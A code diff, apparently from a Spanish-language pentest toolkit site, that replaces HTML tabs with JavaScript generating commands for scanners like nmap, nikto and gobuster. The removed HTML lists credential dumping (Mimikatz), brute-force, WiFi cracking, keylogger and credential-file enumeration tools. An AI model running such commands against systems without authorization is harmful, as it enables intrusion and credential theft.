-                                <option value="chntpw">chntpw</option>
-                                <option value="creddump7">creddump7</option>
-                                <option value="secretsdump">secretsdump</option>
-                                <option value="mimikatz">Mimikatz</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runCredentialDumping()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('credential-dumping.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="creddumpResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== HASH IDENTIFICATION ====== -->
-                <div class="tab-pane fade" id="hashidTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">#️⃣ Hash a identificar</label>
-                            <input type="text" class="form-control" id="hashidTarget" placeholder="5d41402abc4b2a76b9719d911017c592" value="5d41402abc4b2a76b9719d911017c592">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="hashidTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="hashid">hashID</option>
-                                <option value="hash-identifier">Hash-Identifier</option>
-                                <option value="hashcrack">hashcrack</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runHashIdentification()"><i class="fas fa-play me-2"></i>Identificar</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('hash-identification.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="hashidResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== PASSWORD PROFILING ====== -->
-                <div class="tab-pane fade" id="wordlistTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">📝 Target (nombre o URL)</label>
-                            <input type="text" class="form-control" id="wordlistTarget" placeholder="John Doe o https://example.com" value="John Doe">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="wordlistTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="bopscrk">bopscrk</option>
-                                <option value="cewl">CeWL</option>
-                                <option value="crunch">Crunch</option>
-                                <option value="pack">PACK</option>
-                                <option value="rsmangler">RSMangler</option>
-                                <option value="seclists">SecLists</option>
-                                <option value="twofi">Twofi</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runWordlistProfiling()"><i class="fas fa-play me-2"></i>Generar Wordlist</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('wordlist-profiling.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="wordlistResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== BRUTE FORCE ====== -->
-                <div class="tab-pane fade" id="bruteforceTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">🔨 Target (IP o host)</label>
-                            <input type="text" class="form-control" id="bruteforceTarget" placeholder="192.168.1.1" value="192.168.1.1">
-                            <label class="form-label mt-2">🌐 Servicio</label>
-                            <select class="form-select" id="bruteforceService">
-                                <option value="ssh">SSH</option>
-                                <option value="ftp">FTP</option>
-                                <option value="http">HTTP</option>
-                                <option value="rdp">RDP</option>
-                                <option value="smb">SMB</option>
-                                <option value="telnet">Telnet</option>
-                            </select>
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="bruteforceTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="hydra">Hydra</option>
-                                <option value="hydra-gtk">Hydra-GTK</option>
-                                <option value="medusa">Medusa</option>
-                                <option value="netexec">NetExec</option>
-                                <option value="ncrack">Ncrack</option>
-                                <option value="crowbar">Crowbar</option>
-                                <option value="cat">CAT</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runBruteForce()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('brute-force.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="bruteforceResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== PASSWORD CRACKING ====== -->
-                <div class="tab-pane fade" id="passcrackTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">🔓 Hash o archivo</label>
-                            <input type="text" class="form-control" id="passcrackTarget" placeholder="hashes.txt o secret.zip" value="hashes.txt">
-                            <label class="form-label mt-2">📝 Tipo</label>
-                            <select class="form-select" id="passcrackType">
-                                <option value="md5">MD5</option>
-                                <option value="ntlm">NTLM</option>
-                                <option value="sha1">SHA1</option>
-                                <option value="sha256">SHA256</option>
-                                <option value="bcrypt">bcrypt</option>
-                                <option value="zip">ZIP</option>
-                                <option value="tc">TrueCrypt</option>
-                                <option value="ble">BLE Pairing</option>
-                            </select>
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="passcrackTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="hashcat">Hashcat</option>
-                                <option value="john">John the Ripper</option>
-                                <option value="fcrackzip">fcrackzip</option>
-                                <option value="cmospwd">cmospwd</option>
-                                <option value="crackle">Crackle</option>
-                                <option value="truecrack">Truecrack</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runPasswordCracking()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('password-cracking.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="passcrackResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== UNSECURED CREDENTIALS ====== -->
-                <div class="tab-pane fade" id="unsecuredTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">📂 Directorio home</label>
-                            <input type="text" class="form-control" id="unsecuredTarget" placeholder="~/" value="~/">
-                            <label class="form-label mt-2">🔍 Categoría</label>
-                            <select class="form-select" id="unsecuredCategory">
-                                <option value="all">Todas las categorías</option>
-                                <option value="ssh">SSH Keys</option>
-                                <option value="cloud">Cloud Credentials</option>
-                                <option value="history">Shell History</option>
-                                <option value="browser">Browser Credentials</option>
-                                <option value="keyring">Keyring</option>
-                                <option value="git">Git Credentials</option>
-                                <option value="tokens">App Tokens</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runUnsecuredCredentials()"><i class="fas fa-play me-2"></i>Enumerar</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('unsecured-credentials.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="unsecuredResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== WIFI CREDENTIAL ACCESS ====== -->
-                <div class="tab-pane fade" id="wificredTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">📶 BSSID o ESSID</label>
-                            <input type="text" class="form-control" id="wificredTarget" placeholder="AA:BB:CC:DD:EE:FF o MiWiFi" value="AA:BB:CC:DD:EE:FF">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="wificredTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="aircrack-ng">Aircrack-ng</option>
-                                <option value="wifi-honey">Wifi-honey</option>
-                                <option value="wifiphisher">Wifiphisher</option>
-                                <option value="wifite">Wifite</option>
-                                <option value="airgeddon">Airgeddon</option>
-                                <option value="bully">Bully</option>
-                                <option value="fern-wifi-cracker">Fern WiFi Cracker</option>
-                                <option value="eapmd5pass">eapmd5pass</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runWifiCredentialAccess()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('wifi-credential-access.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="wificredResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== KEYLOGGER ====== -->
-                <div class="tab-pane fade" id="keyloggerTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">⌨️ IP objetivo</label>
-                            <input type="text" class="form-control" id="keyloggerTarget" placeholder="192.168.1.100" value="192.168.1.100">
-                            <label class="form-label mt-2">🔌 Puerto X11</label>
-                            <input type="text" class="form-control" id="keyloggerPort" placeholder="6000" value="6000">
-                            <label class="form-label mt-2">⏱️ Timeout (segundos)</label>
-                            <input type="text" class="form-control" id="keyloggerTimeout" placeholder="600" value="600">
-                            <button class="btn-mfh mt-2 w-100" onclick="runKeylogger()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('keylogger.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="keyloggerResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- ====== VoIP CREDENTIAL ACCESS ====== -->
-                <div class="tab-pane fade" id="voipTab">
-                    <div class="row">
-                        <div class="col-md-6">
-                            <label class="form-label">📞 IP objetivo</label>
-                            <input type="text" class="form-control" id="voipTarget" placeholder="192.168.1.100" value="192.168.1.100">
-                            <label class="form-label mt-2">👤 Usuario (opcional)</label>
-                            <input type="text" class="form-control" id="voipUser" placeholder="100" value="100">
-                            <label class="form-label mt-2">🔧 Herramienta</label>
-                            <select class="form-select" id="voipTool">
-                                <option value="all">Todas las herramientas</option>
-                                <option value="svcrack">SVCrack</option>
-                                <option value="enumiax">Enumiax</option>
-                            </select>
-                            <button class="btn-mfh mt-2 w-100" onclick="runVoipCredentialAccess()"><i class="fas fa-play me-2"></i>Generar Comandos</button>
-                            <button class="btn-outline-mfh mt-2 w-100" onclick="downloadTool('voip-credential-access.js')"><i class="fas fa-download me-2"></i>Descargar</button>
-                        </div>
-                        <div class="col-md-6">
-                            <div id="voipResult" class="console-output">🔍 Esperando consulta...</div>
-                        </div>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-    </div>
-</section>
+function esc(str) {
+    return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
+}
 
-<!-- ==================== FOOTER ==================== -->
-<footer>
-    <div class="container">
-        <div class="row">
-            <div class="col-md-4">
-                <h6 class="text-success">MFH TOOLS</h6>
-                <p class="small">Herramientas de Ciberseguridad. Hecho con 🌮 en México.</p>
-            </div>
-            <div class="col-md-4">
-                <h6 class="text-success">Enlaces</h6>
-                <ul class="list-unstyled small">
-                    <li><a href="index.html"><i class="fas fa-arrow-left me-1"></i>Volver al inicio</a></li>
-                    <li><a href="#inicio">Inicio</a></li>
-                    <li><a href="#categorias">Categorías</a></li>
-                    <li><a href="#herramientas">Panel</a></li>
-                </ul>
-            </div>
-            <div class="col-md-4">
-                <h6 class="text-success">Contacto</h6>
-                <ul class="list-unstyled small">
-                    <li><a href="mailto:mfalconh1@gmail.com"><i class="fas fa-envelope me-1"></i> mfalconh1@gmail.com</a></li>
-                </ul>
-                <div class="mt-2">
-                    <a href="https://github.com/Falconmx1/mx_falconmx_security" class="text-white me-2" target="_blank"><i class="fab fa-github"></i></a>
-                </div>
-            </div>
-        </div>
-        <hr class="bg-success">
-        <div class="text-center small">
-            <p>© 2025 MFH TOOLS - Todos los derechos reservados | Hecho con 💚 en México</p>
-        </div>
-    </div>
-</footer>
+function now() { return new Date().toISOString(); }
 
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
-<script src="script-tools.js"></script>
-</body>
-</html>
+function isValidDomain(d) {
+    return /^([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}$/i.test(d);
+}
+
+function isValidIP(ip) {
+    if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) return false;
+    return ip.split('.').every(function(n) {
+        var x = parseInt(n, 10);
+        return x >= 0 && x <= 255;
+    });
+}
+
+function isValidMAC(mac) {
+    return /^([0-9A-F]{2}[:-]){5}([0-9A-F]{2})$/i.test(mac);
+}
+
+function normalizeUrl(url) {
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        return 'http://' + url;
+    }
+    return url;
+}
+
+function codeBlock(text) {
+    return '<div style="background:#000;color:#0f0;padding:6px 10px;border-radius:5px;font-family:Courier New,monospace;font-size:0.75rem;border-left:3px solid #0f0;margin:4px 0;white-space:pre-wrap;word-break:break-all;">' + esc(text) + '</div>';
+}
+
+function line(char, len) {
+    return new Array((len || 50) + 1).join(char || '=');
+}
+
+// ============================================================
+// NAVEGACION ENTRE TABS
+// ============================================================
+function showTool(tool) {
+    var tabMap = {
+        host: 'hostTab',
+        identity: 'identityTab',
+        network: 'networkTab',
+        dns: 'dnsTab',
+        webscan: 'webscanTab',
+        vulnscan: 'vulnscanTab',
+        webvuln: 'webvulnTab',
+        bluetooth: 'bluetoothTab',
+        radio: 'radioTab',
+        wifi: 'wifiTab',
+        creddump: 'creddumpTab',
+        hashid: 'hashidTab',
+        wordlist: 'wordlistTab',
+        bruteforce: 'bruteforceTab',
+        passcrack: 'passcrackTab',
+        unsecured: 'unsecuredTab',
+        wificred: 'wificredTab',
+        keylogger: 'keyloggerTab',
+        voip: 'voipTab'
+    };
+    var tabId = tabMap[tool];
+    if (!tabId) return;
+    var trigger = document.querySelector('button[data-bs-target="#' + tabId + '"]');
+    if (trigger && typeof bootstrap !== 'undefined') {
+        bootstrap.Tab.getOrCreateInstance(trigger).show();
+    }
+    var panel = document.getElementById('herramientas');
+    if (panel) panel.scrollIntoView({ behavior: 'smooth' });
+}
+
+// ============================================================
+// DESCARGA DE HERRAMIENTAS
+// ============================================================
+var AVAILABLE_TOOLS = [
+    'host-information.js',
+    'identity-information.js',
+    'network-information.js',
+    'dns-information.js',
+    'web-scanning.js',
+    'vulnerability-scanning.js',
+    'web-vulnerability-scanning.js',
+    'bluetooth-scanning.js',
+    'radio-frequency-scanning.js',
+    'wifi-scanning.js',
+    'credential-dumping.js',
+    'hash-identification.js',
+    'wordlist-profiling.js',
+    'brute-force.js',
+    'password-cracking.js',
+    'unsecured-credentials.js',
+    'wifi-credential-access.js',
+    'keylogger.js',
+    'voip-credential-access.js'
+];
+
+function downloadTool(filename) {
+    if (!filename) return;
+
+    if (AVAILABLE_TOOLS.indexOf(filename) === -1) {
+        alert('WARN: tool "' + filename + '" no disponible aun.');
+        return;
+    }
+
+    var link = document.createElement('a');
+    link.href = 'tools/' + filename;
+    link.download = filename;
+    link.style.display = 'none';
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+
+    setTimeout(function() {
+        if (link.parentNode) link.parentNode.removeChild(link);
+    }, 100);
+}
+
+// ============================================================
+// HOST INFORMATION
+// ============================================================
+function runHostInfo() {
+    var target = ($('hostTarget') ? $('hostTarget').value : '').trim();
+    if (!target) { setOutput('hostResult', 'ERROR: ingresa un dominio o IP'); return; }
+    setOutput('hostResult', 'Analizando host: ' + esc(target) + '...');
+    setTimeout(function() {
+        var clean = target.replace(/^https?:\/\//, '').split('/')[0];
+        var isIP = isValidIP(clean);
+        var isDomain = isValidDomain(clean);
+        if (!isIP && !isDomain) { setOutput('hostResult', 'ERROR: formato invalido'); return; }
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  HOST INFORMATION REPORT');
+        lines.push('  Target: ' + esc(clean));
+        lines.push('  Tipo: ' + (isIP ? 'IP' : 'Dominio'));
+        lines.push('  Fecha: ' + now());
+        lines.push(line('=', 50));
+        lines.push('');
+        lines.push('Analisis de formato: OK');
+        lines.push('');
+        var susp = [];
+        if (/\d{4,}/.test(clean)) susp.push('Secuencia numerica larga (posible DGA)');
+        if (/\.(xyz|top|club|work|click|loan|bid|tk|ml|ga|cf)$/.test(clean)) susp.push('TLD sospechoso');
+        if (clean.length > 50) susp.push('Dominio muy largo');
+        lines.push('Analisis heuristico:');
+        if (susp.length === 0) lines.push('   OK: sin patrones sospechosos');
+        else susp.forEach(function(s) { lines.push('   WARN: ' + s); });
+        lines.push('');
+        lines.push('Navegador:');
+        lines.push('   - UA: ' + esc(navigator.userAgent.substring(0, 50)) + '...');
+        lines.push('   - Idioma: ' + esc(navigator.language));
+        lines.push('   - Online: ' + (navigator.onLine ? 'SI' : 'NO'));
+        lines.push('');
+        lines.push(line('-', 50));
+        lines.push('TIP: node tools/host-information.js --target ' + esc(clean));
+        setOutput('hostResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// IDENTITY INFORMATION
+// ============================================================
+function runIdentityInfo() {
+    var target = ($('identityTarget') ? $('identityTarget').value : '').trim();
+    if (!target) { setOutput('identityResult', 'ERROR: ingresa un email o usuario'); return; }
+    setOutput('identityResult', 'Analizando: ' + esc(target) + '...');
+    setTimeout(function() {
+        var isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(target);
+        var parts = target.split('@');
+        var user = parts[0] || target;
+        var domain = parts[1] || '(sin dominio)';
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  IDENTITY INFORMATION REPORT');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Fecha: ' + now());
+        lines.push(line('=', 50));
+        lines.push('');
+        lines.push('Info basica:');
+        lines.push('   - Usuario: ' + esc(user));
+        lines.push('   - Dominio: ' + esc(domain));
+        lines.push('   - Email valido: ' + (isEmail ? 'SI' : 'NO'));
+        lines.push('');
+        lines.push('Analisis:');
+        var warns = [];
+        if (user.length < 4) warns.push('Usuario muy corto');
+        if (/^(admin|root|test|user|info|support)$/i.test(user)) warns.push('Usuario generico');
+        if (warns.length === 0) lines.push('   OK: sin patrones sospechosos');
+        else warns.forEach(function(w) { lines.push('   WARN: ' + w); });
+        lines.push('');
+        lines.push(line('-', 50));
+        lines.push('TIP: node tools/identity-information.js --target ' + esc(target));
+        setOutput('identityResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// NETWORK INFORMATION
+// ============================================================
+function runNetworkInfo() {
+    var target = ($('networkTarget') ? $('networkTarget').value : '').trim();
+    if (!target) { setOutput('networkResult', 'ERROR: ingresa una IP o CIDR'); return; }
+    setOutput('networkResult', 'Analizando: ' + esc(target) + '...');
+    setTimeout(function() {
+        var ip = target, cidr = null;
+        if (target.indexOf('/') !== -1) {
+            var p = target.split('/');
+            ip = p[0];
+            cidr = parseInt(p[1], 10);
+        }
+        if (!isValidIP(ip)) { setOutput('networkResult', 'ERROR: IP invalida'); return; }
+        var parts = ip.split('.').map(function(n) { return parseInt(n, 10); });
+        var isPrivate = ip.startsWith('10.') || ip.startsWith('192.168.') || /^172\.(1[6-9]|2\d|3[01])\./.test(ip) || ip.startsWith('127.');
+        var clase = 'Desconocida';
+        if (parts[0] >= 1 && parts[0] <= 126) clase = 'A';
+        else if (parts[0] >= 128 && parts[0] <= 191) clase = 'B';
+        else if (parts[0] >= 192 && parts[0] <= 223) clase = 'C';
+        else if (parts[0] >= 224 && parts[0] <= 239) clase = 'D';
+        else if (parts[0] >= 240) clase = 'E';
+        var binary = parts.map(function(n) { return n.toString(2).padStart(8, '0'); }).join('.');
+        var hex = parts.map(function(n) { return n.toString(16).padStart(2, '0'); }).join(':');
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  NETWORK INFORMATION REPORT');
+        lines.push('  Target: ' + esc(target));
+        lines.push('  Fecha: ' + now());
+        lines.push(line('=', 50));
+        lines.push('');
+        lines.push('Clasificacion:');
+        lines.push('   - IP: ' + esc(ip));
+        lines.push('   - Clase: ' + clase);
+        lines.push('   - Tipo: ' + (isPrivate ? 'PRIVADA' : 'PUBLICA'));
+        lines.push('');
+        lines.push('Representaciones:');
+        lines.push('   - Binario: ' + binary);
+        lines.push('   - Hex: ' + hex);
+        if (cidr !== null) {
+            lines.push('');
+            lines.push('CIDR /' + cidr + ':');
+            lines.push('   - Hosts: ' + Math.pow(2, 32 - cidr).toLocaleString());
+        }
+        lines.push('');
+        lines.push(line('-', 50));
+        lines.push('TIP: node tools/network-information.js --target ' + esc(target));
+        setOutput('networkResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// DNS INFORMATION
+// ============================================================
+function runDnsInfo() {
+    var target = ($('dnsTarget') ? $('dnsTarget').value : '').trim();
+    var type = ($('dnsType') ? $('dnsType').value : 'A');
+    if (!target) { setOutput('dnsResult', 'ERROR: ingresa un dominio'); return; }
+    if (!isValidDomain(target)) { setOutput('dnsResult', 'ERROR: dominio invalido'); return; }
+    setOutput('dnsResult', 'Consultando ' + esc(type) + '...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  DNS INFORMATION REPORT');
+        lines.push('  Dominio: ' + esc(target));
+        lines.push('  Tipo: ' + esc(type));
+        lines.push('  Fecha: ' + now());
+        lines.push(line('=', 50));
+        lines.push('');
+        lines.push('WARN: el navegador no puede hacer DNS lookup real.');
+        lines.push('');
+        lines.push('Consultas recomendadas:');
+        lines.push('   nslookup -type=' + esc(type) + ' ' + esc(target));
+        lines.push('   dig ' + esc(target) + ' ' + esc(type));
+        lines.push('');
+        lines.push(line('-', 50));
+        lines.push('TIP: node tools/dns-information.js --target ' + esc(target) + ' --type ' + esc(type));
+        setOutput('dnsResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// WEB SCANNING
+// ============================================================
+function runWebScanning() {
+    var target = ($('webscanTarget') ? $('webscanTarget').value : '').trim();
+    var tool = ($('webscanTool') ? $('webscanTool').value : 'all');
+    if (!target) { setOutput('webscanResult', 'ERROR: ingresa una URL'); return; }
+    setOutput('webscanResult', 'Generando comandos...');
+    setTimeout(function() {
+        var clean = normalizeUrl(target);
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  WEB SCANNING COMMANDS');
+        lines.push('  Target: ' + esc(clean));
+        lines.push(line('=', 50));
+        lines.push('');
+        var cmds = [];
+        if (tool === 'all' || tool === 'dirb') cmds.push({n: 'DIRB', i: 'sudo apt install dirb', c: 'dirb ' + clean + ' /usr/share/dirb/wordlists/common.txt -o dirb_results.txt'});
+        if (tool === 'all' || tool === 'dirbuster') cmds.push({n: 'DirBuster', i: 'sudo apt install dirbuster', c: 'java -jar DirBuster-1.0-RC1.jar -H -u ' + clean});
+        if (tool === 'all' || tool === 'gobuster') cmds.push({n: 'Gobuster', i: 'sudo apt install gobuster', c: 'gobuster dir -u ' + clean + ' -w /usr/share/wordlists/dirb/common.txt -x php,html,js'});
+        cmds.forEach(function(c) {
+            lines.push('[Tool] ' + c.n);
+            lines.push('   Install: ' + c.i);
+            lines.push(codeBlock(c.c));
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo escanea sitios con autorizacion');
+        setOutput('webscanResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// VULNERABILITY SCANNING
+// ============================================================
+function runVulnScanning() {
+    var target = ($('vulnscanTarget') ? $('vulnscanTarget').value : '').trim();
+    var type = ($('vulnscanType') ? $('vulnscanType').value : 'all');
+    if (!target) { setOutput('vulnscanResult', 'ERROR: ingresa una IP'); return; }
+    setOutput('vulnscanResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  VULNERABILITY SCANNING');
+        lines.push('  Target: ' + esc(target));
+        lines.push(line('=', 50));
+        lines.push('');
+        var allCmds = [
+            {k: 'basic', n: 'Basico', c: 'nmap -sT ' + target},
+            {k: 'stealth', n: 'SYN Stealth', c: 'sudo nmap -sS ' + target},
+            {k: 'version', n: 'Versiones', c: 'sudo nmap -sV -sC ' + target},
+            {k: 'os', n: 'SO', c: 'sudo nmap -O ' + target},
+            {k: 'vuln', n: 'Vulnerabilidades', c: 'sudo nmap --script=vuln ' + target},
+            {k: 'allports', n: 'Todos los puertos', c: 'sudo nmap -p- ' + target},
+            {k: 'udp', n: 'UDP', c: 'sudo nmap -sU --top-ports 100 ' + target}
+        ];
+        var filtered = (type === 'all') ? allCmds : allCmds.filter(function(c) { return c.k === type; });
+        lines.push('[Install] sudo apt install nmap zenmap');
+        lines.push('');
+        filtered.forEach(function(c) {
+            lines.push('[Cmd] ' + c.n);
+            lines.push(codeBlock(c.c));
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo escanea sistemas con autorizacion');
+        setOutput('vulnscanResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// WEB VULNERABILITY SCANNING
+// ============================================================
+function runWebVulnScanning() {
+    var target = ($('webvulnTarget') ? $('webvulnTarget').value : '').trim();
+    var tool = ($('webvulnTool') ? $('webvulnTool').value : 'all');
+    if (!target) { setOutput('webvulnResult', 'ERROR: ingresa una URL'); return; }
+    setOutput('webvulnResult', 'Generando comandos...');
+    setTimeout(function() {
+        var clean = normalizeUrl(target);
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  WEB VULNERABILITY SCANNING');
+        lines.push('  Target: ' + esc(clean));
+        lines.push(line('=', 50));
+        lines.push('');
+        if (tool === 'all' || tool === 'nikto') {
+            lines.push('[Tool] Nikto');
+            lines.push('   Install: sudo apt install nikto');
+            lines.push(codeBlock('nikto -h ' + clean));
+            lines.push(codeBlock('nikto -h ' + clean + ' -o nikto_report.html -F HTML -Tuning x'));
+            lines.push('');
+        }
+        if (tool === 'all' || tool === 'zap') {
+            lines.push('[Tool] OWASP ZAP');
+            lines.push('   Install: sudo apt install zaproxy');
+            lines.push(codeBlock('zaproxy'));
+            lines.push(codeBlock('zap.sh -cmd -quickurl ' + clean + ' -quickout zap_report.html'));
+            lines.push('');
+        }
+        lines.push(line('-', 50));
+        lines.push('Test servers: testphp.vulnweb.com, juice-shop.herokuapp.com');
+        lines.push('WARN: solo escanea sitios con autorizacion');
+        setOutput('webvulnResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// BLUETOOTH SCANNING
+// ============================================================
+function runBluetoothScanning() {
+    var target = ($('bluetoothTarget') ? $('bluetoothTarget').value : '').trim() || 'all';
+    var tool = ($('bluetoothTool') ? $('bluetoothTool').value : 'all');
+    if (target !== 'all' && !isValidMAC(target)) { setOutput('bluetoothResult', 'ERROR: MAC invalida'); return; }
+    setOutput('bluetoothResult', 'Generando comandos...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  BLUETOOTH SCANNING');
+        lines.push('  Target: ' + esc(target));
+        lines.push(line('=', 50));
+        lines.push('');
+        var allTools = {
+            bettercap: {n: 'Bettercap', i: 'sudo apt install bettercap', c: ['sudo bettercap -iface hci0', 'ble.recon on', 'ble.show']},
+            bluetoothctl: {n: 'bluetoothctl', i: 'sudo apt install bluez bluez-tools', c: ['bluetoothctl', 'scan on', 'devices']},
+            hcitool: {n: 'hcitool', i: 'sudo apt install bluez', c: ['sudo hcitool dev', 'sudo hcitool scan', 'sudo hcitool lescan']},
+            btmon: {n: 'btmon', i: 'sudo apt install bluez', c: ['sudo btmon']},
+            bluelog: {n: 'Bluelog', i: 'sudo apt install bluelog', c: ['sudo bluelog -i hci0 -o scan.log -v']}
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: solo escanea con autorizacion');
+        setOutput('bluetoothResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// RADIO FREQUENCY
+// ============================================================
+function runRadioScanning() {
+    var freq = ($('radioFreq') ? $('radioFreq').value : '').trim() || '100000000';
+    var tool = ($('radioTool') ? $('radioTool').value : 'all');
+    setOutput('radioResult', 'Generando comandos SDR...');
+    setTimeout(function() {
+        var lines = [];
+        lines.push(line('=', 50));
+        lines.push('  RADIO FREQUENCY');
+        lines.push('  Frecuencia: ' + esc(freq) + ' Hz');
+        lines.push(line('=', 50));
+        lines.push('');
+        var allTools = {
+            hackrf: {n: 'HackRF', i: 'sudo apt install hackrf', c: ['hackrf_info', 'hackrf_transfer -r capture.iq -f ' + freq + ' -s 2000000']},
+            gnurdio: {n: 'GNU Radio', i: 'sudo apt install gnuradio', c: ['gnuradio-companion']},
+            rtlsdr: {n: 'RTL-SDR', i: 'sudo apt install rtl-sdr', c: ['rtl_test', 'rtl_sdr -f ' + freq + ' -s 2000000 out.iq']},
+            gqrx: {n: 'GQRX', i: 'sudo apt install gqrx-sdr', c: ['gqrx']},
+            'sdr-sharp': {n: 'SDR#', i: 'Descargar de airspy.com', c: ['SDRSharp.exe']},
+            'universal-radio-hacker': {n: 'URH', i: 'pip install urh', c: ['urh']}
+        };
+        var keys = (tool === 'all') ? Object.keys(allTools) : [tool];
+        keys.forEach(function(k) {
+            var t = allTools[k];
+            if (!t) return;
+            lines.push('[Tool] ' + t.n);
+            lines.push('   Install: ' + t.i);
+            t.c.forEach(function(cmd) { lines.push(codeBlock(cmd)); });
+            lines.push('');
+        });
+        lines.push(line('-', 50));
+        lines.push('WARN: transmitir sin licencia es ilegal');
+        setOutput('radioResult', lines.join('<br>'));
+    }, 400);
+}
+
+// ============================================================
+// WIFI SCANNING
